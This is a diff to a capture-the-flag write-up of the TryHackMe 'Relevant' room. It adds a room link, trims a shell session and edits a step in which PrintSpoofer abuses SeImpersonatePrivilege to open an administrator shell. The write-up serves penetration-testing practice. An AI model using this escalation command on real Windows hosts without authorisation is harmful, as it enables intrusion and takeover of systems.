@@ -20,6 +20,9 @@ I encourage you to approach this challenge as an actual penetration test. Consid
 
 Note - Nothing in this room requires Metasploit
 
+### Link to the Romm
+You can find this room [here](https://tryhackme.com/room/relevant).
+
 ## Writeup
 First of all, I made a scan using `nmap`.
 ```
@@ -331,34 +334,6 @@ The command completed with one or more errors.
 After that I searched for the first flag, moving into the file system, and found it on Bob's desktop.
 
 ```
-c:\Windows\System32>cd ..
-cd ..
-
-c:\Windows>cd ..
-cd ..
-
-c:\>cd Users
-cd Users
-
-c:\Users>cd Bob
-cd Bob
-
-c:\Users\Bob>dir  
-dir
- Volume in drive C has no label.
- Volume Serial Number is AC3C-5CB5
-
- Directory of c:\Users\Bob
-
-07/25/2020  02:03 PM    <DIR>          .
-07/25/2020  02:03 PM    <DIR>          ..
-07/25/2020  02:04 PM    <DIR>          Desktop
-               0 File(s)              0 bytes
-               3 Dir(s)  20,255,838,208 bytes free
-
-c:\Users\Bob>cd Desktop
-cd Desktop
-
 c:\Users\Bob\Desktop>dir
 dir
  Volume in drive C has no label.
@@ -437,8 +412,7 @@ I downloaded [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) from github a
 Being able to execute arbitrary commands with administrator privileges I managed to spawn a shell with maximum privileges
 
 ```
-PrintSpoofer64.exe -i -c cmd
-PrintSpoofer64.exe -i -c cmd
+c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd
 [+] Found privilege: SeImpersonatePrivilege
 [+] Named pipe listening...
 [+] CreateProcessAsUser() OK
